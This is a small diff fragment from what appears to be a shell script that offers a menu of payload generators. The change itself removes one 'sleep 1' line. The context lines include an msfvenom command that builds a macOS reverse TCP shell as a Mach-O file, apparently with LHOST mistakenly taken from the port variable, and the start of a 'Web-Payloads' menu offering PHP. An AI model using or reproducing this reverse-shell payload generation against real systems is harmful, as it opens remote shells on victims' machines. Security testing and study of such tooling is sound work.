@@ -68,7 +68,6 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=$port LPORT=$port -f macho > $output
 elif [ "$choice" -eq 3 ]
 then
 echo "Web-Payloads"
-sleep 1
 echo "
 Options:
 Option 1:PHP[0]
